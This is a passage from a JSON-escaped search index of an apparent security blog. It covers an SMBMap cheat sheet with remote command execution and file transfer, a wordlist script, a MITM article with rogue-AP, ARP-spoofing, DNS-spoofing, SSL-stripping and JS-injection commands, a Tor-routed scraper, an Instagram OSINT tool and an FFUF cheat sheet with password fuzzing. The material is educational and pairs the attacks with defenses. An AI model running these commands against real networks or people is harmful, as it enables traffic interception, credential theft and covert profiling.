style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"execute-a-command\"\u003eExecute a Command\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ipconfig\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-to-a-specific-drive\"\u003eConnect to a Specific Drive\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"upload-a-file\"\u003eUpload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/path/to/file.txt\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"download-a-file\"\u003eDownload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-a-specific-share\"\u003eEnumerate a Specific Share\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 -s \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;share_name\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-users\"\u003eEnumerate Users\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 --users\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"key-options\"\u003eKey Options\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the username.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-H \u0026lt;host\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target host.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Connect to a specific share or drive.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-x \u0026lt;command\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Execute a command on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Upload a file to the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--download \u0026lt;remote_file\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Download a file from the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Enumerate a specific share.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--users\u003c/code\u003e\u003c/strong\u003e: Enumerate users on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Check for shares with full permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;port\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a port.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"when-to-use-smbmap\"\u003eWhen to Use SMBMap\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePermission Audits\u003c/strong\u003e: Quickly identify shares with read, write, or full access permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommand Execution\u003c/strong\u003e: Execute remote commands on accessible shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFile Transfers\u003c/strong\u003e: Upload or download files directly from SMB shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUser Enumeration\u003c/strong\u003e: Discover user accounts configured on the target system.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"final-thoughts\"\u003eFinal Thoughts\u003c/h2\u003e\n\u003cp\u003eSMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\u003c/p\u003e","title":"SMBMap"},{"content":"Sometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this Wordlist Generator comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\nWhy Bash? You might be asking, why Bash? Well, there’s beauty in simplicity. This script was created to strip down the task to its essentials: no dependencies, no extra fuss, just the native power of Bash. While there are plenty of tools out there for generating wordlists, this one leans into the Unix philosophy—do one thing, and do it well.\nHow It Works The script takes one or more text files as input, extracts the words, normalizes them to lowercase, removes duplicates, sorts them, and outputs everything into a file called wordlist.txt. The end result? A clean, ordered list of unique words ready for your next project.\nKey Features Simple Input: Accepts multiple text files as input. Automatic Sorting: Ensures the wordlist is alphabetically ordered. No Dependencies: Works out of the box with any modern Bash shell. Efficiency: Processes files with a single command pipeline. Getting Started Installation Just grab the script at the bottom of this page, make it executable, and you’re good to go. Or you can get it on my github :\ngit clone https://github.com/noobosaurus-r3x/Wordlister cd Wordlister chmod +x wordlister.sh Usage The script is designed to be intuitive and easy to use. Here’s the basic syntax:\n./wordlister.sh file1.txt file2.txt file3.txt What It Does Combines the contents of all provided text files. Extracts words by splitting on non-alphanumeric characters. Converts all words to lowercase to avoid duplicates like Word and word. Removes duplicates entirely. Outputs the results into wordlist.txt in the current directory. Example Imagine you have two text files, file1.txt and file2.txt, and you want to generate a wordlist:\nRun the script:\n./wordlister.sh file1.txt file2.txt The script processes the files and outputs:\nCreated wordlist with 500 words Open wordlist.txt to see your results.\nNotes If no files are provided, the script will display a usage message and exit. The output file is overwritten each time the script runs, so be sure to back up your previous wordlists if needed. The Script For those who want a peek under the hood, here’s the full script:\n#!/usr/bin/env bash set -euo pipefail IFS=$\u0026#39;\\n\\t\u0026#39; if [ $# -eq 0 ]; then echo \u0026#34;Usage: $0 \u0026lt;text_file1\u0026gt; [\u0026lt;text_file2\u0026gt; ...]\u0026#34; exit 1 fi wordlist=\u0026#34;wordlist.txt\u0026#34; # Process input files to extract unique words in lowercase LC_ALL=C cat \u0026#34;$@\u0026#34; \\ | tr -c \u0026#39;[:alnum:]\u0026#39; \u0026#39;\\n\u0026#39; \\ | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39; \\ | sort -u \u0026gt; \u0026#34;$wordlist\u0026#34; word_count=$(wc -l \u0026lt; \u0026#34;$wordlist\u0026#34;) echo \u0026#34;Created wordlist with $word_count words\u0026#34; Why Use This Script? If you need a no-nonsense way to generate a wordlist, this script has you covered. It’s lightweight, fast, and doesn’t require any external tools or libraries. Whether you’re working in cybersecurity, natural language processing, or simply organizing your text data, this Bash script is a reliable companion.\nFinal Thoughts Sometimes the simplest tools are the most effective. This wordlist generator isn’t trying to be fancy; it’s just trying to do the job—and it does it well. If you’ve got improvements or ideas, feel free to tweak the script to fit your needs. After all, the best tools are the ones you make your own.\n","permalink":"http://localhost:1313/tools/wordlister/","summary":"\u003cp\u003eSometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this \u003cstrong\u003eWordlist Generator\u003c/strong\u003e comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\u003c/p\u003e","title":"Wordlister"},{"content":"MITM Attacks: How to Crash the Party Between Alice and Bob Man-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, “Don’t mind me.” Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes tweaking what’s being said.\nToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\nWhat Even Is a Man-in-the-Middle Attack? Picture this: Alice and Bob are exchanging secrets—love letters, memes, bank details, or maybe just complaining about Carol. They think they’re communicating directly, but little do they know, Carol is sitting in the middle, reading every word, tweaking the conversation, and cackling like a villain in a bad spy movie.\nIn the digital world, Alice could be your laptop, Bob a website or server, and Carol a hacker lurking on your café’s Wi-Fi or corporate network. She intercepts traffic, decrypts it (sometimes), and messes with it however she pleases.\nThe terrifying part? This can happen to you without you realizing it—until it’s too late.\nHow Carol Crashes the Party: Common MITM Tricks Carol’s bag of tricks is stuffed with clever (and sometimes shockingly simple) ways to hijack your traffic. Here’s how she pulls it off:\n1. Rogue Wi-Fi Access Points: Carol’s Favorite Honeytrap Setting up a rogue Wi-Fi access point doesn’t require much more than a laptop, a coffee shop corner, and a catchy SSID like Free_Cafe_WiFi or Starbux_Free. You think you’re connecting to free Wi-Fi for your overpriced latte, but you’re actually walking straight into Carol’s trap.\nHow It Works (The Tech Bit): Broadcast the Trap: Carol uses tools like Airbase-ng to create a fake access point. airbase-ng -e \u0026#34;Starbux_Guest\u0026#34; -c 6 wlan0mon Monitor the Victims: Your device connects, trusting the familiar name. Carol now acts as the gateway to the internet. Proxy the Traffic: With tools like ettercap or mitmproxy, Carol routes all your traffic through her machine. She can sniff, modify, or inject malware at will. bettercap -T -q -M arp:remote // // -i wlan0 Optional Evil Fun: Carol can inject JavaScript keyloggers, replace downloads with malware, or redirect DNS queries to phishing pages. Why It’s Effective Devices love auto-connecting to networks they recognize, and humans… well, we love free Wi-Fi.\nDefense Tip: Always use a VPN. It wraps your data in encryption, making Carol’s snooping session as useful as watching a scrambled TV channel from the 90s.\n2. ARP Spoofing: “Hi, I’m the Router Now” ARP (Address Resolution Protocol) is like the phonebook for local networks, mapping IP addresses to MAC addresses. But ARP has a fatal flaw: it trusts everyone. Carol exploits this blind trust to impersonate the router and redirect all traffic through herself.\nHow It Works: Carol tells the router: “Hey, I’m Alice.” Carol tells Alice: “Hey, I’m the router.” Traffic meant for Alice or the router now flows through Carol. arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1 Why It’s Effective On a LAN, ARP spoofing is lightning-fast and stealthy. Carol can:\nSniff unencrypted traffic with Wireshark. Modify requests in real time. Drop packets because chaos is fun. The Tell: On compromised machines, running arp -a often exposes duplicate MAC addresses—a sign Carol’s in the mix.\nDefense Tip: Use ARP detection tools like Arpwatch or enable Dynamic ARP Inspection (DAI) on managed switches.\n3. DNS Spoofing: Carol’s Redirection Magic You type bank.com into your browser. Carol decides that’s cute and redirects you to fak3bank.com—a malicious clone where she harvests your login details.\nHow It Works: Carol intercepts DNS requests (via tools like tcpdump): tcpdump -i eth0 udp port 53 She injects a fake DNS response faster than the real DNS server: dnsspoof -i eth0 -f dns_hosts Example dns_hosts file: 133.7.133.7 google.com You land on Carol’s server, which looks real enough for you to log in like a good, oblivious citizen. Defense Tip: Use DNSSEC to validate DNS responses and encrypt queries with DNS-over-HTTPS (DoH).\n4. SSL Stripping: Downgrading You Back to 2005 You know HTTPS—the comforting padlock in your browser bar? Carol strips it away like a magician revealing a trapdoor.\nHow It Works: You type https://example.com. Carol intercepts and strips the HTTPS headers, forcing a plain old HTTP connection. Everything—passwords, credit card info, embarrassing searches—travels unencrypted. bettercap -iface eth0 -caplet https-ui Carol logs it all. The tiny missing s in HTTPS becomes the gateway to your digital life.\nDefense Tip: Use HSTS (HTTP Strict Transport Security) and browser extensions like HTTPS Everywhere to force secure connections.\n5. HTTPS Spoofing: Fake Certificates, Real Problems If SSL stripping is a blunt hammer, HTTPS spoofing is a precision scalpel. Carol doesn’t remove encryption—she fakes it.\nHow It Works: Carol generates a self-signed SSL certificate to impersonate a legitimate server: openssl req -new -x509 -keyout fakekey.pem -out fakecert.pem She intercepts the connection, swapping the real SSL cert for her fake one. Your browser thinks it’s secure (padlock and all), and Carol decrypts everything. Why It Works Most people trust the padlock icon without ever inspecting the certificate details.\nDefense Tip: Use certificate pinning to reject impostor certificates and manually verify SSL certificates for sensitive services.\nMITM Isn’t Just Eavesdropping—It’s Total Manipulation MITM doesn’t stop at listening. Carol can inject malware, redirect you to phishing sites, or swap out legitimate downloads with compromised files. She can even inject JavaScript into HTTP traffic to keylog everything you type. Tools like Bettercap make this child’s play:\nbettercap -iface eth0 -caplet js-inject Final Thoughts: How to Keep Carol Out MITM attacks exploit trust—trust in open networks, unverified certificates, or unsecured protocols. But with a few defenses, you can kick Carol out of the party:\nAlways use a VPN on public networks. Enable HSTS, DNSSEC, and encrypted DNS (DoH/DoT). Inspect SSL certificates, especially on critical services. Watch for anomalies: duplicate MAC addresses, suspicious DNS redirects, or missing HTTPS. In short: trust no one, especially not the Wi-Fi named Free_Cafe_WiFi. Carol’s out there, latte in hand, waiting for you to slip up. Don’t give her the satisfaction.\n","permalink":"http://localhost:1313/articles/mitm_crash_a_party/","summary":"\u003ch1 id=\"mitm-attacks-how-to-crash-the-party-between-alice-and-bob\"\u003e\u003cstrong\u003eMITM Attacks: How to Crash the Party Between Alice and Bob\u003c/strong\u003e\u003c/h1\u003e\n\u003cp\u003eMan-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, \u003cem\u003e“Don’t mind me.”\u003c/em\u003e Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes \u003cem\u003etweaking\u003c/em\u003e what’s being said.\u003c/p\u003e\n\u003cp\u003eToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\u003c/p\u003e","title":"MITM Attacks"},{"content":"InspecTor: A Streamlined Tool for Website Metadata Extraction Pulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\nTo clarify, I’m not a professional developer, just someone who needed a functional solution when existing tools fell short. Most scrapers I tried either broke on .onion domains or failed to process JavaScript-heavy pages. I created InspecTor to extract emails, links, images, and other relevant data without exposing my IP address. While it’s not perfect, it works and might save you some headaches too.\nWhat Makes InspecTor Stand Out? InspecTor focuses on three core capabilities:\nMetadata Extraction: It retrieves emails, phone numbers, links, images, and other exposed data from websites. Tor Support: Requests are routed through the Tor network, enabling anonymous access to .onion domains and privacy-sensitive sites. Dynamic Content Handling: By leveraging Selenium, InspecTor processes JavaScript-heavy pages that traditional scrapers typically ignore. Combined with multithreading for concurrent URL processing, InspecTor offers an efficient way to gather metadata while avoiding flags or blocks.\nKey Features Anonymous Scraping: Routes all requests through the Tor network for IP anonymity and seamless .onion domain access. Dynamic Content Support: Processes JavaScript-dependent pages using Selenium. Targeted Metadata Extraction: Retrieve specific fields like emails, phone numbers, images, and links. Concurrent Processing: Multithreading allows simultaneous scraping of multiple URLs for improved speed. Flexible Output Formats: Export results to JSON, SQLite, or human-readable formats. Configurable Options: Adjust threading, output fields, SSL verification, and more. Setting Up InspecTor 1. Clone the Repository git clone https://github.com/noobosaurus-r3x/InspecTor.git cd InspecTor 2. Install Dependencies pip install -r requirements.txt 3. Install Tor Ensure Tor is installed and running to route requests.\nsudo apt update sudo apt install tor sudo systemctl start tor 4. Set Up Selenium (Optional for Dynamic Content) Install Chrome and ChromeDriver. Ensure ChromeDriver matches your browser version.\nUsing InspecTor Extract Metadata from Specific URLs Provide single or multiple URLs:\npython3 InspecTor.py -u https://example.com https://example.onion Process a File of URLs Input a list of targets from a file:\npython3 InspecTor.py -f urls.txt Force Tor for All Traffic Route all requests through Tor, even for non-.onion domains:\npython3 InspecTor.py -u https://example.com --force-tor Save Results to JSON or SQLite Export metadata to a file or database:\npython3 InspecTor.py -u https://example.onion -o metadata.json python3 InspecTor.py -u https://example.onion --database metadata.db Extract Specific Fields Focus on targeted data:\npython3 InspecTor.py -u https://example.onion --fields emails links -o contact_info.json Handle JavaScript Content Enable Selenium for scraping JavaScript-dependent pages:\npython3 InspecTor.py -u https://example.onion --use-selenium Example Commands Extract everything: python3 InspecTor.py -u https://example.onion --extract-all -o all_metadata.json Grab emails and phone numbers: python3 InspecTor.py -u https://example.com --fields emails phone_numbers -o contact_info.json Ignore SSL certificate issues: python3 InspecTor.py -u https://example.onion --no-verify-ssl --human-readable Output Formats JSON: Structured file output for further processing. SQLite: Database storage for querying and analysis. Human-Readable: Clean, formatted text output for quick reviews. Notes on Tor and Dynamic Content Tor Requirements: Tor must be running on 127.0.0.1:9050. Selenium Setup: Ensure Chrome and ChromeDriver versions match for dynamic content scraping. SSL Verification: Enabled by default; use --no-verify-ssl to bypass invalid certificates. Threading: Control parallel processing with --max-workers for faster scraping. Why I Built InspecTor InspecTor was born out of necessity. Existing tools often fell short when handling .onion domains or JavaScript-heavy pages. As someone who needed a simple and effective way to extract metadata for OSINT investigations, website audits, and cybersecurity research, I created InspecTor.\nIt’s not perfect, but it works. If it helps you solve a problem, that’s great. If you find ways to improve it, even better.\n\u0026ndash;\n","permalink":"http://localhost:1313/tools/inspector/","summary":"\u003ch2 id=\"inspector-a-streamlined-tool-for-website-metadata-extraction\"\u003eInspecTor: A Streamlined Tool for Website Metadata Extraction\u003c/h2\u003e\n\u003cp\u003ePulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\u003c/p\u003e","title":"InspecTor"},{"content":"Gathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where Osintagram comes in: a simple script I put together to finally get Instagram OSINT working again.\nI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\nWhy Osintagram? If you’ve ever tried to scrape data from Instagram, you’ve probably hit limitations like expired session cookies or blocked API calls. Osintagram addresses these issues by:\nUsing Session Cookies: It requires an Instagram session cookie (sockpuppet accounts recommended). This lets you sidestep some of the traditional hurdles of accessing data. Focusing on Practical OSINT: Instead of bloated features, Osintagram keeps it simple and effective—fetching user data like followers, bio, posts, and more. Actually Working: Unlike older tools that throw errors with Instagram’s new API, this one is tested against modern challenges. Features Profile Information Retrieval: Extract usernames, full names, follower and following counts, posts, biographies, and even external website links. Identify whether the account is private or verified. Secure Session Management: Stores session cookies securely using encryption. Straightforward Command-Line Interface: Easy-to-use commands for data extraction. Randomized User Agents: Mimics browser requests to avoid detection. Setting It Up Installation Clone the repository: git clone https://github.com/noobosaurus-r3x/osintagram.git cd osintagram Install dependencies: pip3 install -r requirements.txt Initial Configuration Osintagram relies on an Instagram session ID. During the setup, you’ll provide this ID (from a browser cookie), and the tool will encrypt and store it securely. Use a sockpuppet account to avoid risks.\nRun the setup command:\npython3 osintagram.py --setup This generates two files:\nconfig.ini: Stores encrypted credentials. secret.key: The encryption key for decrypting session IDs. Now you’re ready to dive into OSINT.\nUsing Osintagram To fetch information about a specific Instagram user, run:\npython3 osintagram.py -u \u0026lt;target_username\u0026gt; Replace \u0026lt;target_username\u0026gt; with the Instagram handle you’re interested in. The tool will return:\nProfile stats (followers, following, posts). Account details (bio, verification status, links). The Tech Behind the Tool Osintagram’s architecture is straightforward but effective:\nSession Management: Handles login sessions securely using encrypted cookies. Randomized User Agents: Rotates user agents to simulate real browser activity. Output Handling: Formats fetched data for clarity using rich for visually appealing results. Key Scripts osintagram.py: The main script that orchestrates everything. setup.py: Encrypts and stores session cookies during the initial setup. instagram_api_handler.py: Handles API interactions to fetch profile data. output_manager.py: Manages formatting and presenting results. encryption_utils.py: Encrypts and decrypts session credentials. user_agent_manager.py: Generates randomized user agents. Limitations and Ethical Considerations Limitations: Requires manual extraction of session cookies. Cannot bypass Instagram’s rate limits or restrictions. Ethical Use: Only use this tool on accounts you have permission to analyze. Misuse of OSINT tools can lead to legal consequences. Credits Osintagram is inspired by Toutatis by Palenath. Huge thanks to Palenath for blazing the trail in Instagram OSINT tooling.\nFinal Thoughts Osintagram isn’t trying to reinvent the wheel—it’s here to fill the gaps left by older tools that couldn’t keep up with Instagram’s changes. Whether you’re an OSINT enthusiast or a researcher, it’s a reliable companion for extracting and analyzing Instagram profile data.\nGive it a shot, adapt it to your needs, and let me know if you run into issues.\n","permalink":"http://localhost:1313/tools/osintagram/","summary":"\u003cp\u003eGathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where \u003cstrong\u003eOsintagram\u003c/strong\u003e comes in: a simple script I put together to finally get Instagram OSINT working again.\u003c/p\u003e\n\u003cp\u003eI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\u003c/p\u003e","title":"Osintagram"},{"content":"FFUF (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\nBasic Syntax ffuf -c -w path/to/wordlist -u https://target_url/FUZZ Examples # Filter responses with a content size of 4242 bytes ffuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u0026#34;Host: FUZZ\u0026#34; -fs 4242 # Filter responses with a 401 status code ffuf -w /path/to/values.txt -u https://target_url/script.php?valid_name=FUZZ -fc 401 # Filter 401 responses and fuzz passwords in a POST request ffuf -w /path/to/postdata.txt -X POST -d \u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34; -u https://target_url/login.php -fc 401 Common Flags -c: Enable colorized output. -maxtime: Set the maximum runtime for the process in seconds. -p: Set a delay between requests (e.g., 0.1 seconds). -v: Verbose output. -t: Number of threads (default is 40). -mc: Match specific HTTP status codes (e.g., 200, 301, 403, or all). -fc: Filter out responses by HTTP status codes. -w: Specify the wordlist path. -u: Define the target URL. -s: Enable silent mode. -recursion: Enable recursive fuzzing. -r: Follow redirects. -o: Output results to a file. -of: Specify output format (e.g., json, html, csv, all). -b: Include cookies in the request. Examples # Match all responses, filter 42-byte answers, output colored and verbose ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v # Fuzz host headers and show only status 200 responses ffuf -w hosts.txt -u https://example.org/ -H \u0026#34;Host: FUZZ\u0026#34; -mc 200 # Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34; ffuf -w entries.txt -u https://example.org/ -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39; -fr \u0026#34;error\u0026#34; # Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34; ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr \u0026#34;VAL\u0026#34; -c Tips and Tricks Interactive Mode: Press Enter while FFUF is running to access interactive features, such as reconfiguring filters or saving the state. Multiple Payloads: Use the FUZZ keyword multiple times in a URL (e.g., https://example.org/path/FUZZ/another_path/FUZZ). Variables in URLs: Specify payload locations using variables (e.g., https://example.org/path/{var1}/another_path/{var2}). ","permalink":"http://localhost:1313/cheat-sheets/ffuf/","summary":"\u003cp\u003e\u003cstrong\u003eFFUF\u003c/strong\u003e (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -c -w path/to/wordlist -u https://target_url/FUZZ\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"examples\"\u003eExamples\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a content size of 4242 bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -fs \u003cspan style=\"color:#ae81ff\"\u003e4242\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a 401 status code\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/values.txt -u https://target_url/script.php?valid_name\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eFUZZ -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter 401 responses and fuzz passwords in a POST request\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/postdata.txt -X POST -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34;\u003c/span\u003e -u https://target_url/login.php -fc \u003cspan 